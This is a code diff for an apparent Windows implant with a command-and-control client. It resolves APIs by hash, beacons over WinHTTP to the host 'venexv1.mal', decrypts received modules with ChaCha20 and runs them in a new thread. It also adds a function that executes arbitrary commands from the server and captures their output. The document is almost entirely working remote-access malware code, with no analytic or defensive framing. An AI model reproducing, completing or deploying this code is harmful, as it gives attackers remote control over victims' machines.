@@ -36,6 +36,17 @@ void custom_memcpy(void *dest, const void *src, size_t len) {
     }
 }
 
+void* custom_memset(void* dest, int value, size_t count) {
+    unsigned char* ptr = (unsigned char*)dest;
+    unsigned char byte_value = (unsigned char)value;
+    
+    for (size_t i = 0; i < count; i++) {
+        ptr[i] = byte_value;
+    }
+    
+    return dest;
+}
+
 #include <windows.h>
 
 void* WriteHex(const uint8_t* data, size_t bytes, PFUNCTION_TABLE ft) {
@@ -196,6 +207,7 @@ void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
         return;
     }
 
+
     // Decrypt the payload using ChaCha20
     chacha20_Full(payload, writeableMemory, totalSize);
 
@@ -224,7 +236,7 @@ void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
     params->ft = ft;
 
     // Create a thread to execute the payload
-    HANDLE hThread = ft->Kernel32.CreateThread(NULL, 0, ModuleThread, params, 0, NULL);
+    HANDLE hThread = ft->Kernel32.CreateThread(NULL, 1024 * 1024, ModuleThread, params, 0, NULL);
     if (hThread == NULL) {
         ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
         return;
@@ -239,8 +251,9 @@ void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
 
 void c2BeaconCommunicate(PFUNCTION_TABLE ft){
     HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 5000, 0);
-    HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"GET", L"/?id=unequeID", NULL, NULL, NULL, 0);
+    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 80, 0);
+    HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"GET", L"/?beacon=ALIVE", NULL, NULL, NULL, 0);
+    ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB700\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
     ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
     ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
 
@@ -249,6 +262,9 @@ void c2BeaconCommunicate(PFUNCTION_TABLE ft){
     DWORD dwSize = 0;
     DWORD totalBytesRead = 0;
     DWORD bytesRead;
+
+    CUSTOM_ZeroMemory(buffer, sizeof(buffer));
+
     do {
         ft->WinHttp.WinHttpQueryDataAvailable(hRequest, &dwSize);
         if (dwSize == 0) break; // No more data
@@ -271,14 +287,15 @@ void c2BeaconCommunicate(PFUNCTION_TABLE ft){
     ft->WinHttp.WinHttpCloseHandle(hSession);
 
     // search for signature "NLSM55" in the received data
-    const char *signature = "NLS55";
+    const char *signature = "NSLM55IM";
     BOOL found = FALSE;
     for(int i = 0; i <= totalBytesRead; i++){
-        if(custom_memcmp((char*)(buffer + i), signature, 5) == 0){
+        if(custom_memcmp((char*)(buffer + i), signature, 8) == 0){
             found = TRUE;
-            buffer_ptr = buffer + i + 5; // move pointer past the signature
+            buffer_ptr = buffer + i + 8; // move pointer past the signature
         }
     }
+
     if(!found){return;}
 
     // handle module execution
@@ -326,9 +343,79 @@ void gostPrint(char* message, BOOL format, int message_len, PFUNCTION_TABLE ft) 
 }
 
 // gost Execute function: fetches and executes module from C2 server
-void gostExecute(const char* command, PFUNCTION_TABLE ft){
-    return;
+BOOL gostExecute(char* command, char* output, DWORD outputSize, PFUNCTION_TABLE ft) {
+    //char psCommand[1024];
+    //snprintf(psCommand, sizeof(psCommand), "powershell -Command \"%s\"", command);
+
+    
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(sa);
+    sa.lpSecurityDescriptor = NULL;
+    sa.bInheritHandle = TRUE;
+    
+    HANDLE hStdoutRd, hStdoutWr;
+    if (!ft->Kernel32.CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
+        return FALSE;
+    }
+    
+    ft->Kernel32.SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
+    
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    
+    CUSTOM_ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = hStdoutWr;
+    si.hStdError = hStdoutWr;
+    
+    CUSTOM_ZeroMemory(&pi, sizeof(pi));
+    
+    BOOL success = ft->Kernel32.CreateProcessA(
+        NULL,
+        command,
+        NULL,
+        NULL,
+        TRUE,           // Inherit handles
+        0,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+    
+    if (!success) {
+        ft->Kernel32.CloseHandle(hStdoutRd);
+        ft->Kernel32.CloseHandle(hStdoutWr);
+        return FALSE;
+    }
+    
+    ft->Kernel32.CloseHandle(hStdoutWr);
+    
+    // Read output
+    DWORD bytesRead;
+    CHAR buffer[4096];
+    DWORD totalBytes = 0;
+    
+    while (ft->Kernel32.ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+        if (totalBytes + bytesRead < outputSize) {
+            custom_memcpy(output + totalBytes, buffer, bytesRead);
+            totalBytes += bytesRead;
+        }
+    }
+    
+    output[totalBytes] = '\0';
+
+    //ft->Kernel32.WaitForSingleObject(pi.hProcess, INFINITE);
+    
+    ft->Kernel32.CloseHandle(pi.hProcess);
+    ft->Kernel32.CloseHandle(pi.hThread);
+    ft->Kernel32.CloseHandle(hStdoutRd);
+
+    outputSize = totalBytes;
+    return TRUE;
 }
+
 
 void __main(void) {
     // Initialize function table
@@ -350,6 +437,12 @@ void __main(void) {
     functionTable.Kernel32.GetProcessHeap = getFunctionBase(0x7460A5C2, kernel32Base); // hash of "KERNEL32.DLL" + "ProcessHeap"
     functionTable.Kernel32.Sleep = getFunctionBase(0xF78728AE, kernel32Base); // hash of "KERNEL32.DLL" + "Sleep"
     functionTable.Kernel32.CreateProcessA = getFunctionBase(0x98975766, kernel32Base); // hash of "KERNEL32.DLL" + "CreateProcessA"
+
+    functionTable.Kernel32.CreatePipe = getFunctionBase(0x23E967FD, kernel32Base); // hash of "KERNEL32.DLL" + "CreatePipe"
+    functionTable.Kernel32.SetHandleInformation = getFunctionBase(0x80A469C3, kernel32Base); // hash of "KERNEL32.DLL" + "SetHandleInformation"
+    functionTable.Kernel32.ReadFile = getFunctionBase(0x2ABA496E, kernel32Base); // hash of "KERNEL32.DLL" + "ReadFile"
+
+
     // functionTable.Kernel32.HeapAlloc = getFunctionBase(0x8024706B, kernel32Base); // hash of "KERNEL32.DLL" + "HeapAlloc"
     // functionTable.Kernel32.HeapFree = getFunctionBase(0xD2A541DC, kernel32Base); // hash of "KERNEL32.DLL" + "HeapFree"
 
@@ -363,6 +456,7 @@ void __main(void) {
     functionTable.WinHttp.WinHttpOpen = getFunctionBase(0x9402FA91, winhttpBase); // hash of "winhttp.dll" + "WinHttpOpen"
     functionTable.WinHttp.WinHttpConnect = getFunctionBase(0xA577190A, winhttpBase); // hash of "winhttp.dll" + "WinHttpConnect"
     functionTable.WinHttp.WinHttpOpenRequest = getFunctionBase(0xE8C92EF7, winhttpBase); // hash of "winhttp.dll" + "WinHttpOpenRequest"
+    functionTable.WinHttp.WinHttpAddRequestHeaders = getFunctionBase(0x2B418E8E, winhttpBase); // hash of "winhttp.dll" + "WinHttpAddRequestHeaders"
     functionTable.WinHttp.WinHttpSendRequest = getFunctionBase(0xB2CCBB00, winhttpBase); // hash of "winhttp.dll" + "WinHttpSendRequest"
     functionTable.WinHttp.WinHttpReceiveResponse = getFunctionBase(0x11480B6C, winhttpBase); // hash of "winhttp.dll" + "WinHttpReceiveResponse"
     functionTable.WinHttp.WinHttpQueryDataAvailable = getFunctionBase(0x86637F65, winhttpBase); // hash of "winhttp.dll" + "WinHttpQueryDataAvailable"
